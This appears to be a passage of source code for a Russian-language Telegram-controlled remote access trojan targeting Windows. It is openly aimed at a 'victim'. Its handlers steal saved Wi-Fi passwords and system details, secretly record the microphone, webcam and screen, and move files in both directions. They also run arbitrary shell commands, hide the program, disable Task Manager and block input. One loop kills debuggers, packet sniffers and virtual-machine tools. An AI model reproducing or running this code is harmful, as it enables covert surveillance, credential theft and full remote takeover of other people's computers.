        diskdrive = os.popen('wmic diskdrive get Model, Size, SerialNumber, MediaType, InterfaceType, Status').read().strip()
        compsysinfo = os.popen('wmic computersystem get Model, Manufacturer, TotalPhysicalMemory, Domain, Username, SystemType, NumberOfProcessors').read().strip()
        osinfo = os.popen('wmic os get Caption, Version, OSArchitecture, BuildNumber, RegisteredUser, SerialNumber, InstallDate').read().strip()
        networkadapter = os.popen('wmic nicconfig get Description, MACAddress, IPAddress, DefaultIPGateway, DNSHostName, ServiceName').read().strip()
        minios = os.popen('wmic os get /format:list').read().strip()

        def send_long_message(chat_id, title, content):
            lines = content.splitlines()
            chunk_size = 30  
            chunks = [lines[i:i + chunk_size] for i in range(0, len(lines), chunk_size)]
            
            for idx, chunk in enumerate(chunks):
                bot.send_message(chat_id, f"{title} (part {idx + 1}):\n" + "\n".join(chunk))
        send_long_message(message.chat.id, "PC Properties", prop)
        send_long_message(message.chat.id, "PC OS Version", ver)
        send_long_message(message.chat.id, "PC BIOS", bios)
        send_long_message(message.chat.id, "CPU Info", cpu)
        send_long_message(message.chat.id, "RAM Info", ram)
        send_long_message(message.chat.id, "Computer Info" , compsysinfo)
        send_long_message(message.chat.id, "Disk Drive Info", diskdrive)
        send_long_message(message.chat.id, "OS Info", osinfo)
        send_long_message(message.chat.id, "Network Adapter Info", networkadapter)
        bot.send_message(message.chat.id, f"System Info: {minios}")


    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")  
                
                
#################################################################################
@bot.message_handler(commands=['batteryinfo'])
def batteryinfo(message):
    try:
        # wmic path Win32_Battery get EstimatedChargeRemaining, BatteryStatus, FullChargeCapacity,Status
        batstatus = os.popen('wmic path Win32_Battery get BatteryStatus').read().strip()
        bates = os.popen('wmic path Win32_Battery get EstimatedChargeRemaining').read().strip()
        batname = os.popen('wmic path Win32_Battery get name').read().strip()
        batsysname = os.popen('wmic path Win32_Battery get SystemName').read().strip()
        bot.send_message(message.chat.id, '''В состоянии батареи. каждое число соответствует определенному состоянию батареи.
                                Вот значения:
                         
                         1 - Батарея разряжается
                         2 - Батарея заряжается
                         3 - Батарея полностью заряжена
                         4 - Уровень заряда батареи низкий
                         5 - Уровень заряда батареи критический
                         6 - Аккумулятор заряжается и скоро будет полностью заряжен.
                         7 - Уровень заряда равен нулю''')

        bot.send_message(message.chat.id, f'Battery status: {batstatus}')
        bot.send_message(message.chat.id, f'Battery System name: {batsysname}')
        bot.send_message(message.chat.id, f'Battery name: {batname}')
        bot.send_message(message.chat.id, f'Battery {bates}%')
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")
#############################################################################

@bot.message_handler(commands=['shortinfo'])
def shortpcinfo(message):
    try:
        bot.send_message(message.chat.id , 'Ожидай бро...')
        host_name = os.getenv('COMPUTERNAME', 'Unknown')

        os_name = os.popen('ver').read().strip()
        
        try:
            os_version = os.popen('wmic os get version').read().splitlines()[2].strip()
        except IndexError:
            os_version = 'Unknown'

        try:
            processor_info = os.popen('wmic cpu get Name').read().splitlines()[2].strip()
        except IndexError:
            processor_info = 'Unknown'

        cores = os.cpu_count()

        if os.name == 'nt':
            total_ram = os.popen('wmic computersystem get TotalPhysicalMemory').read().splitlines()[2].strip()
            total_ram = f"{int(total_ram) // (1024 ** 2)} MB" if total_ram.isdigit() else "Not available"
        else:
            total_ram = "Not available"

        boot_time_str = os.popen('systeminfo | find "System Boot Time"').read().strip()
        if boot_time_str:
            boot_time = boot_time_str.split(":")[1].strip()
        else:
            boot_time = "Not available"

        info = {
            "System": os_name,
            "Host name": host_name,
            "OS version": os_version,
            "CPU": processor_info,
            "Core count": cores,
            "RAM": total_ram,
            "Boot time": boot_time
        }

        info_text = "\n".join([f"{key}: {value}" for key, value in info.items()])


        bot.send_message(message.chat.id, info_text)

    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

#############################################################################
@bot.message_handler(commands=['disabletaskmgr'])
def disabtsk(message):       
    try:
        disable_command = r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f'
        os.popen(disable_command)
        bot.send_message(message.chat.id , 'taskmanager выключен!')
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")
        
               
        
#############################################################################
@bot.message_handler(commands=['block'])
def block(message):
    try:
        ctypes.windll.user32.BlockInput(True)
        bot.send_message(message.chat.id , 'Ввод данных пользователем (мышь и клавиатура) успешно заблокирован!')

    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")
#############################################################################
@bot.message_handler(commands=['unblock'])
def unblock(message):
    try:
        ctypes.windll.user32.BlockInput(False)
        bot.send_message(message.chat.id , 'Ввод данных пользователем (мышь и клавиатура) успешно заблокирован!')
        bot.send_message(message.chat.id , 'Если он не разблокирован, запустите еще раз: \n/unblock')
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")
#############################################################################
@bot.message_handler(commands=['enabletaskmgr'])
def disabtsk(message):       
    try:
        enable_command = r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f'
        os.popen(enable_command)
        bot.send_message(message.chat.id , 'taskmanager запущен!')
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")
                
        
      
#############################################################################       
@bot.message_handler(commands=['wifilist'])
def wifipassword(message):
    
    a = os.popen('netsh wlan show profile').read().strip()
    bot.send_message(message.chat.id , f'Wifi networks📶:{a}')

################################

@bot.message_handler(commands=['wifipass'])
def wifipassword(message):
    name = message.text.split('/wifipass', 1)[1].strip()
    results = os.popen(f'netsh wlan show profile name={name} key=clear').read().strip()

    try:
        bot.send_message(message.chat.id ,str(results))
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")

#############################################################################


@bot.message_handler(commands=['rotate'])
def rotate(message):
    angle = 0
    angle = (angle + 90) % 360 
        
    
    pyautogui.hotkey('ctrl', 'alt', {0: 'up', 90: 'right', 180: 'down', 270: 'left'}[angle])
    bot.send_message(message.chat.id,f"rotated +{angle} degrees")







#############################################################################      

# @bot.message_handler(commands=['users'])

# def users(message):
    
#     try:
#         com = os.popen('net user').read().strip()
#         bot.send_message(message.chat.id, f'Res:{com}')
 
#         bot.send_message(message.chat.id, '####################################')
        
#         cm = os.popen('wmic useraccount list brief').read().strip()
#         bot.send_message(message.chat.id, f'Also:{cm}')
    
#     except Exception as e:
#         bot.send_message(message.chat.id, f'Error:{e}')
@bot.message_handler(commands=['users'])
def users(message):
    try:
        com_raw = os.popen('net user').read().strip()
        com_lines = com_raw.splitlines()
        com_output = "\n".join(com_lines)
        
        bot.send_message(message.chat.id, f'Res:\n{com_output}')
        bot.send_message(message.chat.id, '####################################')
        
        cm_raw = os.popen('wmic useraccount list brief').read().strip()
        cm_lines = cm_raw.splitlines()
        
        headers = cm_lines[0].split()
        data_rows = [line.split(maxsplit=len(headers)-1) for line in cm_lines[1:]]

        col_widths = [len(header) for header in headers]
        for row in data_rows:
            for i, item in enumerate(row):
                col_widths[i] = max(col_widths[i], len(item))
        
        def format_row(row):
            return " | ".join(item.ljust(col_widths[i]) for i, item in enumerate(row))
        
        header_row = format_row(headers)
        separator = "-+-".join("-" * width for width in col_widths)
        
        table = [header_row, separator] + [format_row(row) for row in data_rows]
        formatted_cm_output = "\n".join(table)
        
        bot.send_message(message.chat.id, f'Also:\n{formatted_cm_output}')
    
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')
#############################################################################      
@bot.message_handler(commands=['hide'])
def hide(message):
    
    try:
        path = os.getcwd()

        name = os.path.basename(__file__)

        full_path = path + '\\'+ name

        bot.send_message(message.chat.id ,f'Полный путь:{full_path}')

        os.popen(f'attrib +h \"{full_path}\"')
    
        bot.send_message(message.chat.id ,f'Твое приложение скрыто!')
    except Exception as e:
        bot.send_message(message.chat.id , f'Error:{e}')
#############################################################################      

@bot.message_handler(commands=['unhide'])
def unhide(message):
    
    try:
        path = os.getcwd()

        name = os.path.basename(__file__)

        full_path = path + '\\'+ name

        bot.send_message(message.chat.id ,f'ПОлный путь:{full_path}')

        os.popen(f'attrib -h \"{full_path}\"')
    
        bot.send_message(message.chat.id ,f'ваше приложение видно!')
    except Exception as e:
        bot.send_message(message.chat.id , f'Error:{e}')


#############################################################################
@bot.message_handler(commands=['mic'])
def record_audio(message):
    if len(message.text.split()) > 1:
        try:
            record_time = int(message.text.split()[1]) 
        except ValueError:
            bot.reply_to(message, "Неверное время записи. Пожалуйста, введите действительное.")
            return
    else:
        record_time = 5

    
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    WAVE_OUTPUT_FILENAME = "6425s-3erq-eq44-vcx7.wav"

    p = pyaudio.PyAudio()

    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)

    bot.send_message(message.chat.id, f"Запись звука на {record_time} секунд...")

    frames = []

    for i in range(0, int(RATE / CHUNK * record_time)):
        data = stream.read(CHUNK)
        frames.append(data)

    bot.send_message(message.chat.id, "Окончили запись")

    stream.stop_stream()
    stream.close()
    p.terminate()

    with wave.open(WAVE_OUTPUT_FILENAME, 'wb') as wf:
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))

    with open(WAVE_OUTPUT_FILENAME, 'rb') as audio_file:
        bot.send_audio(message.chat.id, audio_file)

    os.remove(WAVE_OUTPUT_FILENAME)
    
@bot.message_handler(commands=['metadata'])
def get_metadata(message):
    filepath = message.text.split('/metadata', 1)[1].strip()

    if not os.path.exists(filepath):
        bot.send_message(message.chat.id, "Error: Файл не существует")
        return

    try:
        statObject = os.stat(filepath)
        
        modificationTime = time.ctime(statObject[stat.ST_MTIME])
        
        sizeInMegaBytes = statObject[stat.ST_SIZE] / 1048576  
        sizeInMegaBytes = round(sizeInMegaBytes, 2)
        
        lastAccessTime = time.ctime(statObject[stat.ST_ATIME])
        
        fileMetadata = f"Last modified: {modificationTime}\n"
        fileMetadata += f"Size in MB: {sizeInMegaBytes} MB\n"
        fileMetadata += f"Last accessed: {lastAccessTime}\n"
        
        bot.send_message(message.chat.id, fileMetadata)
    
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")
###################################################################

@bot.message_handler(commands=['minimize'])
def minimize(message): 
    try:
        pyautogui.hotkey("win", "down")  
        bot.send_message(message.chat.id, "Активное окно было свернуто!")
        bot.send_message(message.chat.id, "Введите команду еще раз, чтобы свернуть окно до уровня панели задач.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['maximize'])
def maximize(message): 
    try:
        pyautogui.hotkey("win", "up")
        bot.send_message(message.chat.id, "Активное окно было развернуто до максимума!")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")
      
#################################################################################
        
@bot.message_handler(commands=['cmdbomb'])
def cmdbomb(message):
    try:

        os.popen('start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd')
        bot.send_message(message.chat.id, 'Открыли 10 CMD')
    except Exception as e:
        bot.send_message(message.chat.id , f'Error: {e}')
        

#############################################################################
   
waiting_for_upload = False     


@bot.message_handler(commands=['upload'])
def handle_upload_command(message):
    global waiting_for_upload
    waiting_for_upload = True
    bot.send_message(message.chat.id, "Отправь свой файл:")

@bot.message_handler(content_types=['document', 'photo', 'audio', 'video', 'voice'])
def handle_file(message):
    global waiting_for_upload
    if waiting_for_upload:
        try:
            file_name = message.document.file_name if message.document else message.photo.file_name
            file_info = bot.get_file(message.document.file_id) if message.document else bot.get_file(message.photo[-1].file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            with open(file_name, 'wb') as new_file:
                new_file.write(downloaded_file)
            directory = os.getcwd() 
            bot.send_message(message.chat.id, f'Файл был успешно отправлен в: {directory}')
            waiting_for_upload = False
        except Exception as e:
            bot.send_message(message.chat.id, f'Error: {e}')
    else:
        bot.send_message(message.chat.id, 'Напиши сначала /upload ')

#############################################################################

@bot.message_handler(commands=['altf4'])
def altf(message):
    try:
        pyautogui.hotkey('alt' , 'f4')
        bot.send_message(message.chat.id , 'ALT + F4 нажаты')
    except Exception as e:
        bot.send_message(message.chat.id , f'Error: {e}') 
#############################################################################
@bot.message_handler(commands=['run'])
def startfile(message):
    try:
        file = message.text.split('/run' , 1)[1].strip()
        os.popen(f'start {str(file)}')
        bot.send_message(message.chat.id, 'Файл успешно открыт!')
    except Exception as e:
        bot.send_message(message.chat.id , f'Error:{e}') 

#############################################################################

@bot.message_handler(commands=['changeclipboard'])
def chgclip(message):
    try:
        text = message.text.split('/changeclipboard' , 1)[1].strip()
        
        command = 'echo | set /p nul=' + text.strip() + '| clip'
        os.system(command)
        bot.send_message(message.chat.id,f'Буфер обмена поменян на \"{text}\" !') 
    except Exception as e:
        bot.send_message(message.chat.id , f'Error: {e}') 




#############################################################################
@bot.message_handler(commands=['wallpaper'])
def wallpaper(message):
    
    bot.send_message(message.chat.id, "Сначала напиши /upload и загрузи свою картинку")

    bot.send_message(message.chat.id, "Затем отправьте название фотографии, чтобы сменить обои на рабочем столе:")
    bot.register_next_step_handler(message, wall)
    
def wall(message):
    filename = message.text

    if not filename.startswith('/'):
        try:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(str(filename)), 0)
            bot.send_message(message.chat.id, "Обои сменили!")
    
        except Exception as e:
            bot.send_message(message.chat.id, f'Error{e}')


#############################################################################
@bot.message_handler(commands=['download'])

def download_file(message):
    download_file = message.text.split('/download', 1)[1].strip()
    try:      
        with open(download_file , 'rb') as file:
            if str(download_file[-3:]) == 'png':
                bot.send_photo(message.chat.id, file)
            elif str(download_file[-3:]) == 'jpg':
                bot.send_photo(message.chat.id, file)
            elif str(download_file[-3:]) == 'svg':
                bot.send_photo(message.chat.id, file)
            elif str(download_file[-3:]) == 'jpeg':
                bot.send_photo(message.chat.id, file)
            elif str(download_file[-3:]) == 'mkv':
                bot.send_video(message.chat.id, file , timeout=100)
            else:
                bot.send_document(message.chat.id, file)
    except Exception as e:
        bot.send_message(message.chat.id, f'Error{e}')

#############################################################################
@bot.message_handler(commands=['fullvolume'])

def volp(message):
    try:
        n = 0
        while n < 70:
            pyautogui.press('volumeup')
            n += 1
        

        bot.send_message(message.chat.id, 'фулл громкость готово!')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error{e}')
#############################################################################
@bot.message_handler(commands=['volumeplus'])

def volp(message):
    try:
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        bot.send_message(message.chat.id, 'успешно +10')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error{e}')
#############################################################################
@bot.message_handler(commands=['volumeminus'])

def volm(message):
    try:
        pyautogui.press('volumedown')
        pyautogui.press('volumedown')
        pyautogui.press('volumedown')
        pyautogui.press('volumedown')
        pyautogui.press('volumedown')
        bot.send_message(message.chat.id, 'успешно -10')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error{e}')
#############################################################################
@bot.message_handler(commands=['webcam'])

def camsw(message):
    bot.send_message(message.chat.id , 'Переключите камеру (0 - камера по умолчанию)')
    msg = bot.send_message(message.chat.id , 'Введите 0, 1 или другой индекс:')
    bot.register_next_step_handler(msg, lambda msg: camv(msg, int(msg.text)))

def camv(message, camera_index):
    msg = bot.send_message(message.chat.id , 'Введите время записи:')
    bot.register_next_step_handler(msg, lambda msg: camer(msg, camera_index, int(msg.text)))

def camer(message, camera_index, record_time):
    bot.send_message(message.chat.id , 'Ожидай...')
    cap = cv2.VideoCapture(camera_index)

    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    output_file = '498j-33v1-9d24-z390.mkv'
    output_v = cv2.VideoWriter(output_file, fourcc, 20.0, (640, 480))

    start_time = time.time()

    while True:
        ret, frame = cap.read()
        if ret:
            output_v.write(frame)
            if time.time() - start_time > record_time:
                break
        else:
            break

    cap.release()
    output_v.release()
    cv2.destroyAllWindows()

    try:
        with open(output_file, 'rb') as video_file:
            bot.send_document(message.chat.id, video_file, timeout=122)
    except Exception as e:
        bot.send_message(message.chat.id , f'Error: {e}')

    os.remove('498j-33v1-9d24-z390.mkv')
#############################################################################
@bot.message_handler(commands=['help'])

def help(message):
    if n == False:
        bot.send_message(message.chat.id, "Введите пароль: ")
        bot.register_next_step_handler(message, checkpasswd)
    else:
        bot.send_message(message.chat.id,textovik)
def checkpasswd(message):
    if message.text == 'vedmoor':
        global n
        n = True
        bot.send_message(message.chat.id, '✅ Пароль верный.')
        bot.send_message(message.chat.id, textovik)
    else:
        bot.send_message(message.chat.id, '❌ Неверный пароль')


#################################################################################
@bot.message_handler(commands=['examples'])

def examples(message):
    bot.send_message(message.chat.id, examplestext)

#################################################################################

@bot.message_handler(commands=['textspech'])
def screen(message):
    try:
        text = message.text.split('/textspech', 1)[1].strip()
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()
        bot.send_message(message.chat.id , f'{text}  отправленно успешно!')

    except Exception as e:
        bot.send_message(message.chat.id , f'Error: {e}')
#################################################################################
@bot.message_handler(commands=['screenrecord'])
def screen(message):
    
    msg = bot.send_message(message.chat.id , 'Введите время записи:')
    bot.register_next_step_handler(msg, scr)
def scr(message):
    bot.send_message(message.chat.id , 'Please wait...')
    screen_width, screen_height = pyautogui.size()

    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    output_video = cv2.VideoWriter('498j-33v1-9d24-z390.mkv', fourcc, 10.0, (screen_width, screen_height))


    start_time = time.time()


    while True:

        screenshot = pyautogui.screenshot()


        frame = np.array(screenshot)
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)

        output_video.write(frame)

        if time.time() - start_time > int(message.text):
            break

    output_video.release()
    cv2.destroyAllWindows()

    try:    
        with open('498j-33v1-9d24-z390.mkv' , 'rb') as screenvideo:
            bot.send_document(message.chat.id , screenvideo , timeout=122)
    except Exception as e:
        bot.send_message(message.chat.id , f'Error:{e}')
    os.remove('498j-33v1-9d24-z390.mkv')


#################################################################################
@bot.message_handler(commands=['info'])
def information(message):
# about location
    try:
        
        result = os.popen('curl ipinfo.io/ip').read().strip()
        bot.send_message(message.chat.id,f"Ip:\n {result}")
        
        ###########################################################
        
        result = os.popen('curl ipinfo.io/city').read().strip()
        bot.send_message(message.chat.id,f"City:\n {result}")
        
        ###########################################################
        
        
        result = os.popen('curl ipinfo.io/region').read().strip()
        bot.send_message(message.chat.id,f"Region:\n {result}")
            
        ###########################################################
        
        result = os.popen('curl ipinfo.io/country').read().strip()
        bot.send_message(message.chat.id,f"Country:\n {result}")
                
        ###########################################################
        
        result = os.popen('curl ipinfo.io/loc').read().strip()
        bot.send_message(message.chat.id,f"Location:\n {result}")
        
        ###########################################################
        
        result = os.popen('curl ipinfo.io/org').read().strip()
        bot.send_message(message.chat.id,f"Provider:\n {result}")
            
        ###########################################################
        
        result = os.popen('curl ipinfo.io/postal').read().strip()
        bot.send_message(message.chat.id,f"Postal:\n {result}")
                
        ###########################################################
        
        result = os.popen('curl ipinfo.io/timezone').read().strip()
        bot.send_message(message.chat.id,f"Timezone:\n {result}")

    except Exception as e:
        bot.send_message(message.chat.id, f"Error:{e}")
#################################################################################


#################################################################################

@bot.message_handler(commands=['winblocker2'])
def winblocker(message):
    bot.send_message(message.chat.id ,'Windows is blocked!')

    while True:
        c = os.popen('tasklist').read().strip()

        blacklisted_processes = [
                'perfmon.exe', 
                'Taskmgr.exe',
                'ProcessHacker.exe',
                'cmd.exe',
                'explorer.exe' ,
                'vmwareuser.exe',
                'fakenet.exe', 
                'dumpcap.exe', 
                'httpdebuggerui.exe', 
                'wireshark.exe', 
                'fiddler.exe', 
                'vboxservice.exe', 
                'df5serv.exe', 
                'vboxtray.exe', 
                'vmwaretray.exe', 
                'ida64.exe', 
                'ollydbg.exe', 
                'pestudio.exe', 
                'vgauthservice.exe', 
                'vmacthlp.exe', 
                'x96dbg.exe', 
                'x32dbg.exe', 
                'prl_cc.exe', 
                'prl_tools.exe', 
                'xenservice.exe', 
                'qemu-ga.exe', 
                'joeboxcontrol.exe', 
                'ksdumperclient.exe', 
                'ksdumper.exe', 
                'joeboxserver.exe', 
            ]

        for badproc in blacklisted_processes:
                
            if badproc in c:
                if badproc == 'cmd.exe':
                    pass
                else:
                    bot.send_message(message.chat.id ,f'{badproc} is killed!')
                os.popen(f'taskkill /f /im {badproc}')


###################################################################

@bot.message_handler(commands=['playsound'])
def plsound(message):
    try:
    
        muspath = message.text.split('/playsound', 1)[1].strip()

        os.popen(f'start {muspath}')
    
        bot.send_message(message.chat.id, 'Жертве запустили музон успешно')

    except Exception as e:
        bot.send_message(message.chat.id, f'Error:{e}')    

###################################################################
@bot.message_handler(commands=['chrome'])
def opensite(message):
    try:
        site = message.text.split('/chrome', 1)[1].strip()
        os.popen(f'start chrome "{site}"')
        bot.send_message(message.chat.id, f'Site:{site} открыт успешно')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error:{e}')
        
#################################################################################


@bot.message_handler(commands=['edge'])
def opensite(message):
    try:
        site = message.text.split('/edge', 1)[1].strip()
        os.popen(f'start msedge "{site}"')
        bot.send_message(message.chat.id, f'Site:{site} открыт успешно')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error:{e}')
        
#################################################################################


@bot.message_handler(commands=['firefox'])
def opensite(message):
    try:
        site = message.text.split('/firefox', 1)[1].strip()
        os.popen(f'start firefox "{site}"')
        bot.send_message(message.chat.id, f'Site:{site} открыт успешно')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error:{e}')
        

#################################################################################
@bot.message_handler(commands=['webscreen'])
def take_photo(message):
    try:
        
        cap = cv2.VideoCapture(0)

        
        ret, frame = cap.read()

        
        photo_path = 'photo.jpg'
        cv2.imwrite(photo_path, frame)

        
        with open(photo_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)

        
        os.remove(photo_path)

        
        cap.release()

    except Exception as e:
        bot.send_message(message.chat.id, f"Error capturing photo: {e}")
#################################################################################

@bot.message_handler(commands=['screenshot'])
def take_screenshot(message):
    try:
        
        screenshot_path = 'screenshot.png'
        pyautogui.screenshot(screenshot_path)

        
        with open(screenshot_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)

        
        os.remove(screenshot_path)

    except Exception as e:
        bot.send_message(message.chat.id, f"Error :(: {e}")

current_directory = os.getcwd()

#################################################################################

@bot.message_handler(commands=['sleep'])
def slip(message):
    try:
        ctypes.windll.PowrProf.SetSuspendState(0, 1, 0)
        bot.send_message(message.chat.id, 'отправили пк на слип мод!') 
    except Exception as e:
        bot.send_message(message.chat.id, f"Error :(: {e}")


#################################################################################


@bot.message_handler(commands=['cd'])
def change_directory_command(message):
    try:
        global current_directory 
        new_directory = message.text.split('/cd', 1)[1].strip()
        
        
        os.chdir(new_directory)
        current_directory = os.getcwd()
        
        bot.send_message(message.chat.id, f"Твоя дериктория:\n{current_directory}")
    except Exception as e:
        bot.send_message(message.chat.id, f"This directory does not exists: {e}")


#################################################################################



@bot.message_handler(commands=['whoami'])
def whoami_command(message):
    
    result = os.popen('whoami').read().strip()

    
    bot.send_message(message.chat.id, f'result: {result}')
 
 
 
#################################################################################
    
execute_enabled = False  

def execute_command(command):
    global execute_enabled

    try:
        if command.lower() == 'exit':
            execute_enabled = False
            return "Exit"

        elif command.lower() == 'cd..':
            current_directory = os.getcwd()
            parent_directory = os.path.abspath(os.path.join(current_directory, os.pardir))
            os.chdir(parent_directory)
            return f"You are in: {parent_directory}"

        elif command.lower().startswith('cd '):
            directory = command.lower().split(' ', 1)[1].strip()
            os.chdir(directory)
            return f"You are in: {directory}"

        else:
            result = os.popen(command.lower()).read()
            return f"Result:\n\n{result}"

    except Exception as e:
        return f"Error:\n\n{e}"

@bot.message_handler(commands=['execute'])
def handle_execute(message):
    global execute_enabled
    execute_enabled = True
    bot.send_message(message.chat.id, "Введи команду (пиши \"exit\", для выхода):")

@bot.message_handler(func=lambda message: execute_enabled)
def handle_command(message):
    command_result = execute_command(message.text)
    bot.send_message(message.chat.id, command_result)

############################################################################
###################
    

@bot.message_handler(commands=['shellexecute'])

def command_execution(message):
    
    command = message.text.split('/shellexecute', 1)[1].strip()
    res = os.popen(command).read()
    
    bot.send_message(message.chat.id, f"Result of command:\n\n{res}")
    
@bot.message_handler(commands=['e'])

def command_execution(message):
    try:
        command = message.text.split('/e', 1)[1].strip()
        if command == 'cd..':
            current_directory = os.getcwd()
            parent_directory = os.path.abspath(os.path.join(current_directory, os.pardir))
            os.chdir(parent_directory)
            bot.send_message(message.chat.id, f"You are in: {parent_directory}")
        elif command.startswith('cd '):
            directory = command.split(' ', 1)[1].strip()
            os.chdir(directory)
            bot.send_message(message.chat.id, f"You are in: {directory}")
        else:
            res = os.popen(command).read()
            bot.send_message(message.chat.id, f"Result:\n\n{res}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error:\n\n{e}")
    
#################################################################################
    
    
MAX_MESSAGE_LENGTH = 4096

@bot.message_handler(commands=['ex'])
def command_execution(message):
    try:
        command = message.text.split('/ex', 1)[1].strip()
        
        if command == 'cd..':
            current_directory = os.getcwd()
            parent_directory = os.path.abspath(os.path.join(current_directory, os.pardir))
            os.chdir(parent_directory)
            bot.send_message(message.chat.id, f"You are in: {parent_directory}")
            
        elif command.startswith('cd '):
            directory = command.split(' ', 1)[1].strip()
            os.chdir(directory)
            bot.send_message(message.chat.id, f"You are in: {os.getcwd()}")
            
        else:
            res = os.popen(command).read()
            
            
            res_chunks = [res[i:i + MAX_MESSAGE_LENGTH] for i in range(0, len(res), MAX_MESSAGE_LENGTH)]
            
            if len(res_chunks) > 1:
                
                with open('_windows_.txt', 'w', encoding='utf-8') as file:
                    file.write(res)
                    os.popen( "attrib +h r.txt" )
                with open('_windows_.txt', 'rb') as document:
                    bot.send_document(message.chat.id, document)
                os.remove('_windows_.txt')
            else:
                
                for res_chunk in res_chunks:
                    bot.send_message(message.chat.id, f"Result:\n\n{res_chunk}")

    except Exception as e:
        bot.send_message(message.chat.id, f"Error:\n\n{e}")
#################################################################################
@bot.message_handler(commands=['shutdown'])
def command_execution(message):
    
    try:
        
        os.popen('shutdown /s /f /t 0')
        
        bot.send_message(message.chat.id, "pc выключен!")
    except Exception as e:
       
        bot.send_message(message.chat.id, f'Error:{e}')


#################################################################################


@bot.message_handler(commands=['restart'])
def command_execution(message):
    
    try:
        
        os.popen('shutdown /r /f /t 0')

        bot.send_message(message.chat.id, "перезагружаем пк жертвы!")
    except Exception as e:
       
        bot.send_message(message.chat.id, f'Error:{e}')
        
        
#################################################################################

@bot.message_handler(commands=['tasklist'])
def command_execution(message):
    try:
        command = 'tasklist'
        

        res = os.popen(command).read()
            
            
        res_chunks = [res[i:i + MAX_MESSAGE_LENGTH] for i in range(0, len(res), MAX_MESSAGE_LENGTH)]
            
        if len(res_chunks) > 1:
                
            with open('_windows_.txt', 'w', encoding='utf-8') as file:
                file.write(res)
                os.popen( "attrib +h r.txt" )
            with open('_windows_.txt', 'rb') as document:
                bot.send_document(message.chat.id, document)
            os.remove('_windows_.txt')
        
        res = os.popen('wmic process get description').read().strip()
        res_chunks = [res[i:i + MAX_MESSAGE_LENGTH] for i in range(0, len(res), MAX_MESSAGE_LENGTH)]
            
        if len(res_chunks) > 1:
                
            with open('_windows2_.txt', 'w', encoding='utf-8') as file:
                file.write(res)
                os.popen( "attrib +h r.txt" )
            with open('_windows2_.txt', 'rb') as document:
                bot.send_document(message.chat.id, document)
            os.remove('_windows2_.txt')        
        
        else:
                
            for res_chunk in res_chunks:
                bot.send_message(message.chat.id, f"Result:\n\n{res_chunk}")

    except Exception as e:
        bot.send_message(message.chat.id, f"Error:\n\n{e}")

if __name__ == "__main__":

    bot.polling(none_stop=True)


